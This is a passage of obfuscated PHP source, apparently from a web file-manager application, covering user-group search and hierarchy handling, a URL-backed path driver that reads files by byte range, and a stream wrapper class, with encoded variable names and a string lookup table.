array_to_keyvalue($“ªã”Ñº, $Ì®Ğ›¹[12], $Ì®Ğ›¹[1834]); return array_unique($†îğü«”); } public function listByID($âÚ×Ú„Í) { $ıç™áÌ¶ =& $_SERVER[ÏéâËõ‘]; if (!$âÚ×Ú„Í) { return array(); } $ûÂÂÃÈ¢ = array($ıç™áÌ¶[1834] => array($ıç™áÌ¶[7], $âÚ×Ú„Í)); $™ÁíÜû¸ = $this->where($ûÂÂÃÈ¢)->select(); $™ÁíÜû¸ = array_sort_keep($™ÁíÜû¸, $ıç™áÌ¶[1834], $âÚ×Ú„Í); $this->_listDataApply($™ÁíÜû¸); return $™ÁíÜû¸; } public function listSearch($ŠÃÄ¹ù) { $Í¡š÷ßö =& $_SERVER[ÏéâËõ‘]; $ìº¸…´š = $ŠÃÄ¹ù[$Í¡š÷ßö[1928]]; $Î˜ûñòÚ = isset($ŠÃÄ¹ù[$Í¡š÷ßö[1929]]) ? $ŠÃÄ¹ù[$Í¡š÷ßö[1929]] : !1; if (!trim($ìº¸…´š)) { return !1; } $ìº¸…´š = str_replace($Í¡š÷ßö[1930], $Í¡š÷ßö[1931], $ìº¸…´š); $¼›ëººâ = array($Í¡š÷ßö[1834] => array($Í¡š÷ßö[383], "{$ìº¸…´š}\x25"), $Í¡š÷ßö[32] => array($Í¡š÷ßö[383], "\45{$ìº¸…´š}\x25"), $Í¡š÷ßö[1005] => $Í¡š÷ßö[1932]); if ($Î˜ûñòÚ) { $®•ÔÔ¾‰ = $this->getInfoSimple($Î˜ûñòÚ); $ÁÑ±ÌŒµ = $®•ÔÔ¾‰[$Í¡š÷ßö[521]] . $Î˜ûñòÚ . $Í¡š÷ßö[551]; $¼›ëººâ = array($¼›ëººâ, array($Í¡š÷ßö[521] => array($Í¡š÷ßö[383], $ÁÑ±ÌŒµ))); } $¼›ëººâ = $this->parseWhereLike($¼›ëººâ); $Ğ­¥²®ù = $this->_makeOrder()->where($¼›ëººâ)->selectPage(20); $Ğ­¥²®ù = $Ğ­¥²®ù ? $Ğ­¥²®ù : array($Í¡š÷ßö[369] => array(), $Í¡š÷ßö[366] => array()); if (!$Ğ­¥²®ù || count($Ğ­¥²®ù[$Í¡š÷ßö[369]]) < 5 && Input::check($ìº¸…´š, $Í¡š÷ßö[318])) { $ªö¾¡±ò = $this->groupChildrenAll($Î˜ûñòÚ); $Â’âß™„ = $this->_searchFromMeta($Í¡š÷ßö[464], $ìº¸…´š, 10, $ªö¾¡±ò); $¢åà‰é = $this->_searchFromMeta($Í¡š÷ßö[465], $ìº¸…´š, 10, $ªö¾¡±ò); $À”É…ï§ = array_merge($Â’âß™„, $¢åà‰é, $Ğ­¥²®ù[$Í¡š÷ßö[369]]); $Ğ­¥²®ù[$Í¡š÷ßö[369]] = array_unique_by_key($À”É…ï§, $Í¡š÷ßö[1834]); $Ğ­¥²®ù[$Í¡š÷ßö[366]][$Í¡š÷ßö[367]] = count($Ğ­¥²®ù[$Í¡š÷ßö[369]]); $Ğ­¥²®ù[$Í¡š÷ßö[366]][$Í¡š÷ßö[368]] = ceil($Ğ­¥²®ù[$Í¡š÷ßö[366]][$Í¡š÷ßö[367]] / $Ğ­¥²®ù[$Í¡š÷ßö[366]][$Í¡š÷ßö[363]]); } $this->_listDataApply($Ğ­¥²®ù[$Í¡š÷ßö[369]]); return $Ğ­¥²®ù; } protected function groupChildrenAll($ÜÕ—·‹) { $¡ÃÊ¹Şš =& $_SERVER[ÏéâËõ‘]; if (!$ÜÕ—·‹) { return !1; } if (is_string($ÜÕ—·‹)) { $ÜÕ—·‹ = array($ÜÕ—·‹); } $ƒò¿Ô†Å = $ÜÕ—·‹; foreach ($ÜÕ—·‹ as $îèùÓÛ) { $¸ şÚ¹ = $this->getInfoSimple($îèùÓÛ); $ƒ—·Ä¤¸ = array($¡ÃÊ¹Şš[521] => array($¡ÃÊ¹Şš[383], $¸ şÚ¹[$¡ÃÊ¹Şš[521]] . $îèùÓÛ . $¡ÃÊ¹Şš[551])); $“Ö¿Ğ›£ = $this->field($¡ÃÊ¹Şš[1834])->where($ƒ—·Ä¤¸)->select(); $ƒò¿Ô†Å = array_merge($ƒò¿Ô†Å, array_to_keyvalue($“Ö¿Ğ›£, $¡ÃÊ¹Şš[12], $¡ÃÊ¹Şš[1834])); } return array_unique($ƒò¿Ô†Å); } private function _searchFromMeta($¼¿ÜÍ‰£, $¸…ğ•à™, $ ıù¸ığ, $°·æÃ‹¢) { $æšá­ÇÌ =& $_SERVER[ÏéâËõ‘]; $¸…ğ•à™ = strtolower($¸…ğ•à™); $ºáË¦ ’ = array($æšá­ÇÌ[94] => $¼¿ÜÍ‰£, $æšá­ÇÌ[374] => array($æšá­ÇÌ[383], "\x25{$¸…ğ•à™}\45")); $ºáË¦ ’ = $this->parseWhereLike($ºáË¦ ’); if ($°·æÃ‹¢) { $ºáË¦ ’[$æšá­ÇÌ[1834]] = array($æšá­ÇÌ[7], $°·æÃ‹¢); } $ÉØÊüÀ = Model($æšá­ÇÌ[1933])->where($ºáË¦ ’)->limit($ ıù¸ığ)->select(); if (!$ÉØÊüÀ) { return array(); } $ÉØÊüÀ = array_to_keyvalue($ÉØÊüÀ, $æšá­ÇÌ[12], $æšá­ÇÌ[1834]); $‡¹€¢†… = $this->where(array($æšá­ÇÌ[1922] => array($æšá­ÇÌ[7], $ÉØÊüÀ)))->select(); if (!$‡¹€¢†…) { return array(); } return $‡¹€¢†…; } protected function _listDataApplyItem($ÎÌàÛ³ ) { $Ï‘ÊÄ¢ü = array($ÎÌàÛ³ ); $this->_listDataApply($Ï‘ÊÄ¢ü); return $Ï‘ÊÄ¢ü[0]; } protected function _listDataApply(&$™é–ì´Ú) { $”ÓŸú§Ğ =& $_SERVER[ÏéâËõ‘]; if (!$™é–ì´Ú) { return; } $»’…¸†Å = array_to_keyvalue($™é–ì´Ú, $”ÓŸú§Ğ[12], $”ÓŸú§Ğ[1834]); $this->_listAppendChildren($™é–ì´Ú); $this->_listAppendChildrenMember($™é–ì´Ú); $this->_listAppendMeta($™é–ì´Ú, $»’…¸†Å); $this->_listAppendParent($™é–ì´Ú); $this->_listAppendSourceRoot($™é–ì´Ú, $»’…¸†Å); } private function _listAppendChildren(&$“ªÏ¤™) { $çæÕ¡³¸ =& $_SERVER[ÏéâËõ‘]; $–ˆúËÖ = array_to_keyvalue($“ªÏ¤™, $çæÕ¡³¸[12], $çæÕ¡³¸[1834]); $Æ–Èï = array($çæÕ¡³¸[432] => array($çæÕ¡³¸[7], $–ˆúËÖ)); $Òûğ›Æ× = array($çæÕ¡³¸[432], $çæÕ¡³¸[1934] => $çæÕ¡³¸[500]); $ÔÈÏŸ× = $this->field($Òûğ›Æ×)->where($Æ–Èï)->group($çæÕ¡³¸[432])->select(); $›õã‹Ù“ = array_to_keyvalue($ÔÈÏŸ×, $çæÕ¡³¸[432], $çæÕ¡³¸[500]); foreach ($“ªÏ¤™ as &$ñˆ²úÍ¬) { $Ÿ©ØšÕş = $ñˆ²úÍ¬[$çæÕ¡³¸[1834]]; $ñˆ²úÍ¬[$çæÕ¡³¸[1935]] = isset($›õã‹Ù“[$Ÿ©ØšÕş]) ? intval($›õã‹Ù“[$Ÿ©ØšÕş]) : !1; } unset($ñˆ²úÍ¬); } private function _listAppendChildrenMember(&$·Â©„®û) { $÷••¬Ñ =& $_SERVER[ÏéâËõ‘]; $§éŸ€Ô = array_to_keyvalue($·Â©„®û, $÷••¬Ñ[12], $÷••¬Ñ[1834]); $àš–ò¸¼ = array($÷••¬Ñ[1834] => array($÷••¬Ñ[7], $§éŸ€Ô)); $†Ä½ÚàŞ = array($÷••¬Ñ[1834], $÷••¬Ñ[1934] => $÷••¬Ñ[500]); $µ´¦¢” = Model($÷••¬Ñ[1924])->field($†Ä½ÚàŞ)->where($àš–ò¸¼)->group($÷••¬Ñ[1834])->select(); $å›˜Ôß• = array_to_keyvalue($µ´¦¢”, $÷••¬Ñ[1834], $÷••¬Ñ[500]); foreach ($·Â©„®û as &$ì¤šíí») { $şÌóÈŠõ = $ì¤šíí»[$÷••¬Ñ[1834]]; $ì¤šíí»[$÷••¬Ñ[1936]] = isset($å›˜Ôß•[$şÌóÈŠõ]) ? intval($å›˜Ôß•[$şÌóÈŠõ]) : !1; } unset($ì¤šíí»); } private function _listAppendMeta(&$Ù¬É»¿†, $¼»€Óö’) { $”ôëÊ™Ş =& $_SERVER[ÏéâËõ‘]; $Ê»æÊí = array($”ôëÊ™Ş[1834] => array($”ôëÊ™Ş[7], $¼»€Óö’)); $”Ê¶ÉÕ = Model($”ôëÊ™Ş[1923])->where($Ê»æÊí)->select(); $”Ê¶ÉÕ = array_to_keyvalue_group($”Ê¶ÉÕ, $”ôëÊ™Ş[1834]); foreach ($”Ê¶ÉÕ as &$’˜–»Ğ) { $’˜–»Ğ = array_to_keyvalue($’˜–»Ğ, $”ôëÊ™Ş[94], $”ôëÊ™Ş[374]); } unset($’˜–»Ğ); foreach ($Ù¬É»¿† as &$Ö³•±Î) { $Ö³•±Î[$”ôëÊ™Ş[466]] = array(); if (isset($”Ê¶ÉÕ[$Ö³•±Î[$”ôëÊ™Ş[1834]]])) { $Ö³•±Î[$”ôëÊ™Ş[466]] = $”Ê¶ÉÕ[$Ö³•±Î[$”ôëÊ™Ş[1834]]]; } } unset($Ö³•±Î); } protected function parentLevelArray($¾™Ä¹§¶) { $ùŸîªší =& $_SERVER[ÏéâËõ‘]; $¾™Ä¹§¶ = explode($ùŸîªší[50], trim($¾™Ä¹§¶, $ùŸîªší[50])); $¾™Ä¹§¶ = array_remove_value($¾™Ä¹§¶, $ùŸîªší[197]); return $¾™Ä¹§¶; } protected function parentInGroup($òÍÙ¾Ì¢, $Û¿ÄöæŞ) { $Ÿ»üÆ =& $_SERVER[ÏéâËõ‘]; $ÍéÖê·Œ = $this->getInfoSimple($òÍÙ¾Ì¢); if (!$ÍéÖê·Œ) { return !0; } $¶’½Ì‚ = $this->parentLevelArray($ÍéÖê·Œ[$Ÿ»üÆ[521]]); $¶’½Ì‚[] = $òÍÙ¾Ì¢; foreach ($¶’½Ì‚ as $òÍÙ¾Ì¢) { if (in_array($òÍÙ¾Ì¢ . $Ÿ»üÆ[12], $Û¿ÄöæŞ)) { return !0; } } return !1; } private function _listAppendParent(&$äêöÑÕ) { $Ä³ß÷ÇÜ =& $_SERVER[ÏéâËõ‘]; $Êßîõš„ = array(); foreach ($äêöÑÕ as &$¬óŸ•óâ) { $Êßîõš„[$¬óŸ•óâ[$Ä³ß÷ÇÜ[1834]]] = $¬óŸ•óâ[$Ä³ß÷ÇÜ[32]]; $ÃÃÑ‘Íı = $this->parentLevelArray($¬óŸ•óâ[$Ä³ß÷ÇÜ[521]]); foreach ($ÃÃÑ‘Íı as $Á¬§íÑ) { if (!isset($Êßîõš„[$Á¬§íÑ])) { $Êßîõš„[$Á¬§íÑ] = 0; } } } unset($¬óŸ•óâ); foreach ($Êßîõš„ as $ö“âæ½— => $úêßã«„) { if ($úêßã«„) { continue; } $×‹Ñ¹æ = $this->getInfoSimple($ö“âæ½—); $Êßîõš„[$ö“âæ½—] = $×‹Ñ¹æ[$Ä³ß÷ÇÜ[32]]; } $¤óûÀò¨ = $GLOBALS[$Ä³ß÷ÇÜ[6]][$Ä³ß÷ÇÜ[89]][$Ä³ß÷ÇÜ[1937]]; if ($GLOBALS[$Ä³ß÷ÇÜ[503]] == $Ä³ß÷ÇÜ[88]) { $¤óûÀò¨ = !1; } foreach ($äêöÑÕ as &$¬óŸ•óâ) { $ÃÃÑ‘Íı = $this->parentLevelArray($¬óŸ•óâ[$Ä³ß÷ÇÜ[521]]); $¬ÉËÙ¢¦ = $Ä³ß÷ÇÜ[12]; foreach ($ÃÃÑ‘Íı as $ö“âæ½— => $Á¬§íÑ) { if ($¤óûÀò¨ && $ö“âæ½— == 0) { continue; } $¬ÉËÙ¢¦ .= $Êßîõš„[$Á¬§íÑ] . $Ä³ß÷ÇÜ[8]; } if ($ÃÃÑ‘Íı) { $¬ÉËÙ¢¦ .= $¬óŸ•óâ[$Ä³ß÷ÇÜ[32]]; } $¬óŸ•óâ[$Ä³ß÷ÇÜ[526]] = str_replace($Ä³ß÷ÇÜ[529], $Ä³ß÷ÇÜ[8], $¬ÉËÙ¢¦); } unset($¬óŸ•óâ); } private function _listAppendSourceRoot(&$ƒŠ»¨Å, $½¾¨‘ûê) { $í„‹Ó·Ì =& $_SERVER[ÏéâËõ‘]; $»Ô»ò¥İ = Model($í„‹Ó·Ì[827])->listSourceRoot(SourceModel::TYPE_GROUP, $½¾¨‘ûê); $»Ô»ò¥İ = array_to_keyvalue($»Ô»ò¥İ, $í„‹Ó·Ì[505]); $»Ô»ò¥İ = array_remove_key($»Ô»ò¥İ, $í„‹Ó·Ì[505]); foreach ($ƒŠ»¨Å as &$Çì›éßö) { $Çì›éßö[$í„‹Ó·Ì[86]] = $»Ô»ò¥İ[$Çì›éßö[$í„‹Ó·Ì[1834]]] ? $»Ô»ò¥İ[$Çì›éßö[$í„‹Ó·Ì[1834]]] : array(); } unset($Çì›éßö); } protected function groupMerge($’ºş¡È) { $’ºş¡È = array_values(array_unique($’ºş¡È)); $»±­…”è = array(); for ($ØçËü» = 0; $ØçËü» < count($’ºş¡È); $ØçËü»++) { $ ¸Åùİã = !1; for ($¢ù ú¢» = 0; $¢ù ú¢» < count($’ºş¡È); $¢ù ú¢»++) { if ($ØçËü» == $¢ù ú¢») { continue; } if ($this->isParentOf($’ºş¡È[$¢ù ú¢»], $’ºş¡È[$ØçËü»])) { $ ¸Åùİã = !0; break; } } if (!$ ¸Åùİã) { $»±­…”è[] = $’ºş¡È[$ØçËü»]; } } return $»±­…”è; } protected function isParentOf($™÷¬‹¤, $éÈÚœÚ) { $ì®Ú­ =& $_SERVER[ÏéâËõ‘]; if (!$™÷¬‹¤ || !$éÈÚœÚ || $™÷¬‹¤ == $éÈÚœÚ) { return !1; } $¶ä£“üã = $this->getInfoSimple($™÷¬‹¤); $ø§ˆÁ°» = $this->getInfoSimple($éÈÚœÚ); $†ÇéœñĞ = $¶ä£“üã[$ì®Ú­[521]] . $™÷¬‹¤ . $ì®Ú­[50]; if (substr($ø§ˆÁ°»[$ì®Ú­[521]], 0, strlen($†ÇéœñĞ)) == $†ÇéœñĞ) { return !0; } return !1; } public function groupShowRoot($®¥û†›, $‰Ş©Ù„ô = false) { $• ¡×Ò¹ =& $_SERVER[ÏéâËõ‘]; $ìˆåºË´ = $this->getInfo($®¥û†›); if (!$ìˆåºË´) { return array(); } $œï¨êÛü = $this->parentLevelArray($ìˆåºË´[$• ¡×Ò¹[521]]); $â‚ºöªØ = array($®¥û†›); if (count($œï¨êÛü) == 0) { return $â‚ºöªØ; } if ($‰Ş©Ù„ô && count($œï¨êÛü) == 1) { return $â‚ºöªØ; } if (!$ìˆåºË´[$• ¡×Ò¹[466]] || !isset($ìˆåºË´[$• ¡×Ò¹[466]][$• ¡×Ò¹[1920]]) || $ìˆåºË´[$• ¡×Ò¹[466]][$• ¡×Ò¹[1920]] == $• ¡×Ò¹[1889]) { return $this->groupShowRoot($œï¨êÛü[count($œï¨êÛü) - 1], $‰Ş©Ù„ô); } if ($ìˆåºË´[$• ¡×Ò¹[466]][$• ¡×Ò¹[1920]] == $• ¡×Ò¹[357]) { $¢ƒ®şƒ = explode($• ¡×Ò¹[50], $ìˆåºË´[$• ¡×Ò¹[466]][$• ¡×Ò¹[1921]]); if ($¢ƒ®şƒ) { $â‚ºöªØ = array_merge($â‚ºöªØ, $¢ƒ®şƒ); } } return $â‚ºöªØ; } protected function resetParentLevel() { $öõºê¨ã =& $_SERVER[ÏéâËõ‘]; $¦áá¹êŠ = $öõºê¨ã[1834]; $–À—¡¯Ò = $this->select(); $–À—¡¯Ò = array_to_keyvalue($–À—¡¯Ò, $¦áá¹êŠ); foreach ($–À—¡¯Ò as $«è£½ÕÏ) { $´µ³‹  = $«è£½ÕÏ; $¸œ´©€ = array(); while ($´µ³‹ [$öõºê¨ã[432]] != 0) { $¸œ´©€[] = $´µ³‹ [$öõºê¨ã[432]]; $´µ³‹  = $–À—¡¯Ò[$´µ³‹ [$öõºê¨ã[432]]]; } $¸œ´©€[] = 0; $¸œ´©€ = $öõºê¨ã[50] . implode($öõºê¨ã[50], array_reverse($¸œ´©€)) . $öõºê¨ã[50]; $this->setNamePinyin($«è£½ÕÏ[$¦áá¹êŠ], $«è£½ÕÏ[$öõºê¨ã[32]]); $this->where(array($¦áá¹êŠ => $«è£½ÕÏ[$¦áá¹êŠ]))->save(array($öõºê¨ã[590] => $¸œ´©€)); } return $–À—¡¯Ò; } public function groupNameAuto($Ø¹¿ğÙÛ, $çş˜­ú¼) { $“ÏÂì½è =& $_SERVER[ÏéâËõ‘]; $êÜÇĞâ = $this->where(array($“ÏÂì½è[401] => $Ø¹¿ğÙÛ))->getField($“ÏÂì½è[32], !0); if (!$êÜÇĞâ || !in_array($çş˜­ú¼, $êÜÇĞâ)) { return $çş˜­ú¼; } for ($˜²±Ú«… = 1; $˜²±Ú«… <= count($êÜÇĞâ) + 1; $˜²±Ú«…++) { $âŠƒÎË = $çş˜­ú¼ . "\x28{$˜²±Ú«…}\x29"; if (!in_array($âŠƒÎË, $êÜÇĞâ)) { return $âŠƒÎË; } } } public function groupSwitch($ŠòÅõ¹, $Ÿ³êÜ‡) { $ÔÖ‰È±Û =& $_SERVER[ÏéâËõ‘]; $¦ ç¤¿ = array($ÔÖ‰È±Û[1834] => array($ÔÖ‰È±Û[7], array($ŠòÅõ¹, $Ÿ³êÜ‡))); $ï¤””š• = $this->where($¦ ç¤¿)->select(); $ï¤””š• = array_to_keyvalue($ï¤””š•, $ÔÖ‰È±Û[1834]); if (!isset($ï¤””š•[$ŠòÅõ¹]) || !isset($ï¤””š•[$Ÿ³êÜ‡]) || $ï¤””š•[$ŠòÅõ¹][$ÔÖ‰È±Û[432]] == 0) { return !1; } $¦ ç¤¿ = array($ÔÖ‰È±Û[1834] => $ŠòÅõ¹); $ÊÚ²Ø = Model($ÔÖ‰È±Û[1924])->where($¦ ç¤¿)->select(); if (!$ÊÚ²Ø) { $ÊÚ²Ø = array(); } foreach ($ÊÚ²Ø as $‚âÜå·Ñ) { $Ô¢ÁõÍ¥ = $‚âÜå·Ñ[$ÔÖ‰È±Û[1662]]; $¦ ç¤¿ = array($ÔÖ‰È±Û[1662] => $Ô¢ÁõÍ¥, $ÔÖ‰È±Û[1834] => $Ÿ³êÜ‡); $Íàãñ­Ì = Model($ÔÖ‰È±Û[1924])->where($¦ ç¤¿)->find(); if (!$Íàãñ­Ì) { $±¥§ˆ®‚ = array($Ÿ³êÜ‡ => $‚âÜå·Ñ[$ÔÖ‰È±Û[1938]]); Model($ÔÖ‰È±Û[535])->userGroupAdd($Ô¢ÁõÍ¥, $±¥§ˆ®‚); } Model($ÔÖ‰È±Û[535])->userGroupRemove($Ô¢ÁõÍ¥, $ŠòÅõ¹); } $¦ ç¤¿ = array($ÔÖ‰È±Û[411] => 2, $ÔÖ‰È±Û[432] => 0, $ÔÖ‰È±Û[410] => 1, $ÔÖ‰È±Û[505] => array($ÔÖ‰È±Û[7], array($ŠòÅõ¹, $Ÿ³êÜ‡))); $²à°‰• = Model($ÔÖ‰È±Û[827])->where($¦ ç¤¿)->field($ÔÖ‰È±Û[1939])->select(); $²à°‰• = array_to_keyvalue($²à°‰•, $ÔÖ‰È±Û[505], $ÔÖ‰È±Û[402]); $ìÃ •×„ = !empty($²à°‰•[$ŠòÅõ¹]) ? $²à°‰•[$ŠòÅõ¹] : !1; if ($ìÃ •×„) { if (!$²à°‰•[$Ÿ³êÜ‡]) { $²à°‰•[$Ÿ³êÜ‡] = Model($ÔÖ‰È±Û[827])->groupRootAdd($Ÿ³êÜ‡); } $³”¼şÊ = $²à°‰•[$Ÿ³êÜ‡]; $¦ ç¤¿ = array($ÔÖ‰È±Û[432] => $ìÃ •×„); $²à°‰• = Model($ÔÖ‰È±Û[827])->where($¦ ç¤¿)->field($ÔÖ‰È±Û[1940])->select(); if (!$²à°‰•) { $²à°‰• = array(); } Model($ÔÖ‰È±Û[827])->moveClearAuth = !1; foreach ($²à°‰• as $ØÒØ´ÓÔ) { $—°Ü¥‘ = $ØÒØ´ÓÔ[$ÔÖ‰È±Û[410]] == $ÔÖ‰È±Û[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÔÖ‰È±Û[827])->move($ØÒØ´ÓÔ[$ÔÖ‰È±Û[402]], $³”¼şÊ, $—°Ü¥‘); } Model($ÔÖ‰È±Û[827])->moveClearAuth = !0; $¦ ç¤¿ = array($ÔÖ‰È±Û[411] => 2, $ÔÖ‰È±Û[505] => $ŠòÅõ¹); $øïê’ä– = array($ÔÖ‰È±Û[505] => $Ÿ³êÜ‡); Model($ÔÖ‰È±Û[1941])->where($¦ ç¤¿)->save($øïê’ä–); Model($ÔÖ‰È±Û[1942])->where($¦ ç¤¿)->save($øïê’ä–); } $this->_changeChildLevel($ï¤””š•[$ŠòÅõ¹], $ï¤””š•[$Ÿ³êÜ‡], !0); $this->where(array($ÔÖ‰È±Û[432] => $ŠòÅõ¹))->save(array($ÔÖ‰È±Û[432] => $Ÿ³êÜ‡)); $this->_clearChildrenCache($ï¤””š•[$Ÿ³êÜ‡]); return !0; } } goto D·‰•Š°Ê˜; eòÉ·¦«À: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Üİ¬£Ø· = false) { } public function exist($Íç¢‹¬İ) { $•Í¥èƒ± = $this->info($Íç¢‹¬İ); return $•Í¥èƒ±[$_SERVER[ÏéâËõ‘][201]]; } public function isFile($ÄæÀ¶ÔÉ) { $ °Ùå‡á = $this->info($ÄæÀ¶ÔÉ); return $ °Ùå‡á[$_SERVER[ÏéâËõ‘][201]]; } public function isFolder($åŠ–úÌ) { return !1; } public function size($Õ‰¤š›) { $ÏåŸÊæ¼ = $this->info($Õ‰¤š›); return $ÏåŸÊæ¼[$_SERVER[ÏéâËõ‘][76]]; } public function info($ØœŸ‚Õ™) { return $this->infoParse($ØœŸ‚Õ™); } public function infoAuth($ş„á³Ï) { return $this->infoParse($ş„á³Ï); } public function infoWithChildren($íØ¸Øî») { return $this->infoParse($íØ¸Øî»); } public function infoFull($´±‹ƒ€¥) { return $this->infoParse($´±‹ƒ€¥); } private function infoParse($Ÿ¾ŞÆ—) { $äÏçİÙ =& $_SERVER[ÏéâËõ‘]; $«–ù¯õĞ = $this->header($Ÿ¾ŞÆ—); if (!$«–ù¯õĞ || !$«–ù¯õĞ[$äÏçİÙ[752]]) { return !1; } $Şèø¶Ï = _get($«–ù¯õĞ, $äÏçİÙ[337], 0); $¶š™“Æ¿ = array($äÏçİÙ[32] => $«–ù¯õĞ[$äÏçİÙ[32]], $äÏçİÙ[84] => $Ÿ¾ŞÆ—, $äÏçİÙ[33] => $äÏçİÙ[199], $äÏçİÙ[76] => intval($Şèø¶Ï), $äÏçİÙ[174] => get_path_ext($«–ù¯õĞ[$äÏçİÙ[32]]), $äÏçİÙ[1384] => $Şèø¶Ï > 0 && $«–ù¯õĞ[$äÏçİÙ[1506]], $äÏçİÙ[1385] => !1); return $¶š™“Æ¿; } private function header($€ÛùÌé) { $èÎûí• =& $_SERVER[ÏéâËõ‘]; if (isset(self::$_cacheHeader[$€ÛùÌé])) { return self::$_cacheHeader[$€ÛùÌé]; } $çÔíåß‡ = isset($GLOBALS[$èÎûí•[1507]]) ? $GLOBALS[$èÎûí•[1507]] : !1; $GLOBALS[$èÎûí•[1507]] = !0; self::$_cacheHeader[$€ÛùÌé] = url_header($€ÛùÌé); $GLOBALS[$èÎûí•[1507]] = $çÔíåß‡; return self::$_cacheHeader[$€ÛùÌé]; } public function hashSimple($åÒä›³’, $¤—ù ï = false) { $ğİçäí¬ =& $_SERVER[ÏéâËõ‘]; $ûøÙ³­‘ = $this->info($åÒä›³’); if (!$ûøÙ³­‘ || !$ûøÙ³­‘[$ğİçäí¬[201]]) { return !1; } $­§®Ô†” = $ûøÙ³­‘[$ğİçäí¬[76]]; $„şš¯ = 200; $øÉÌŠÔ” = 50; if ($­§®Ô†” <= $„şš¯ * $øÉÌŠÔ”) { return md5($this->fileSubstr($åÒä›³’, 0, $­§®Ô†”)) . $­§®Ô†”; } $ªşŞÇ¥ = intval($­§®Ô†” / $øÉÌŠÔ”); $õƒ¹ÔÂÂ = $ğİçäí¬[12]; $µŠÚ¯îÍ = timeFloat(); $ìèä†Í¾ = 15; for ($€³Œóƒ§ = 0; $€³Œóƒ§ < $øÉÌŠÔ”; $€³Œóƒ§++) { if (timeFloat() - $µŠÚ¯îÍ > $ìèä†Í¾) { return !1; } $®õ»é‰« = $this->fileSubstr($åÒä›³’, $ªşŞÇ¥ * $€³Œóƒ§, $„şš¯); if (!$®õ»é‰«) { return !1; } $õƒ¹ÔÂÂ .= $®õ»é‰«; } $õƒ¹ÔÂÂ .= $this->fileSubstr($åÒä›³’, $­§®Ô†” - $„şš¯, $„şš¯); return md5($õƒ¹ÔÂÂ) . $­§®Ô†”; } public function getContent($ÉòˆŸó) { return $this->fileSubstr($ÉòˆŸó); } public function fileSubstr($³ÖŒ¿ç§, $€°îû¿˜ = 0, $®Åœ°Éõ = -1) { $ƒˆò‘… =& $_SERVER[ÏéâËõ‘]; $¨ÌëÓ­ = $this->info($³ÖŒ¿ç§); if (!$¨ÌëÓ­ || !$¨ÌëÓ­[$ƒˆò‘…[201]] && $¨ÌëÓ­[$ƒˆò‘…[76]] > 1024 * 1024 * 10) { return !1; } if ($®Åœ°Éõ === -1) { $®Åœ°Éõ = $¨ÌëÓ­[$ƒˆò‘…[76]]; } if ($®Åœ°Éõ == 0) { return $ƒˆò‘…[12]; } $Šûå©‰À = array($ƒˆò‘…[1508] . $€°îû¿˜ . $ƒˆò‘…[784] . ($€°îû¿˜ + $®Åœ°Éõ - 1)); $›˜“Ôşº = url_request($³ÖŒ¿ç§, $ƒˆò‘…[230], !1, $Šûå©‰À, !1, !1, 1); return $›˜“Ôşº[$ƒˆò‘…[1198]] ? $›˜“Ôşº[$ƒˆò‘…[1198]] : $ƒˆò‘…[12]; } public function download($Âª¢È¶, $ªëï¡ĞÚ) { Downloader::start($Âª¢È¶, $ªëï¡ĞÚ); return $ªëï¡ĞÚ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($÷›ûüÕ…, $Ó¢ù¹Ç = '') { $this->info = $this->info($÷›ûüÕ…); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÏéâËõ‘][84]]; $this->pathOpen = $÷›ûüÕ…; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$÷›ûüÕ…])) { self::$_chunkBuffer[$÷›ûüÕ…] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($şòß±¢) { $¥»¦®¤Ø = $this->fileSubstr($this->pose, $şòß±¢); $this->pose += strlen($¥»¦®¤Ø); return $¥»¦®¤Ø; } public function stream_tell() { return $this->pose; } public function stream_seek($Ñ§¾àñ¦, $â­¼»ä) { $áä«ş¦Ÿ =& $_SERVER[ÏéâËõ‘]; if ($â­¼»ä == SEEK_SET) { $this->pose = $Ñ§¾àñ¦; } else { if ($â­¼»ä == SEEK_CUR) { $this->pose += $Ñ§¾àñ¦; } else { if ($â­¼»ä == SEEK_END) { $this->pose = $this->info[$áä«ş¦Ÿ[76]] + intval($Ñ§¾àñ¦); } } } if ($Ñ§¾àñ¦ < 0) { $this->pose = $this->info[$áä«ş¦Ÿ[76]] + $Ñ§¾àñ¦; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÏéâËõ‘][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ùĞ‘ï˜–, $ÀËøŸù) { $˜Şìı«Ù =& $_SERVER[ÏéâËõ‘]; $ÅœİËÎ = $this->info($ùĞ‘ï˜–); return array($˜Şìı«Ù[1509] => 0, $˜Şìı«Ù[1510] => 0, $˜Şìı«Ù[16] => 32768 + 511, $˜Şìı«Ù[1511] => 0, $˜Şìı«Ù[1512] => 0, $˜Şìı«Ù[1513] => 0, $˜Şìı«Ù[1514] => 0, $˜Şìı«Ù[76] => $ÅœİËÎ[$˜Şìı«Ù[76]], $˜Şìı«Ù[1515] => $ÅœİËÎ[$˜Şìı«Ù[1383]], $˜Şìı«Ù[1471] => $ÅœİËÎ[$˜Şìı«Ù[85]], $˜Şìı«Ù[1470] => $ÅœİËÎ[$˜Şìı«Ù[200]], $˜Şìı«Ù[1516] => 0, $˜Şìı«Ù[1517] => 0); } static $fileInfo = array(); public function info($Ï…ÂÜ³£) { $¬†õú½¬ = $_SERVER[ÏéâËõ‘][1518]; if (isset(self::$fileInfo[$Ï…ÂÜ³£])) { return self::$fileInfo[$Ï…ÂÜ³£]; } if (substr($Ï…ÂÜ³£, 0, strlen($¬†õú½¬)) != $¬†õú½¬) { return !1; } self::$fileInfo[$Ï…ÂÜ³£] = IO::info(substr($Ï…ÂÜ³£, strlen($¬†õú½¬))); return self::$fileInfo[$Ï…ÂÜ³£]; } public static function read($ìÃË¡¼­, $‰é£ªÒ, $™ÖäûÄ) { if (!isset(self::$_fopenCache[$ìÃË¡¼­])) { $Éú©èÉ = new StreamWrapperIO(); $Éú©èÉ->stream_open($ìÃË¡¼­); self::$_fopenCache[$ìÃË¡¼­] = $Éú©èÉ; } $Éú©èÉ = self::$_fopenCache[$ìÃË¡¼­]; return 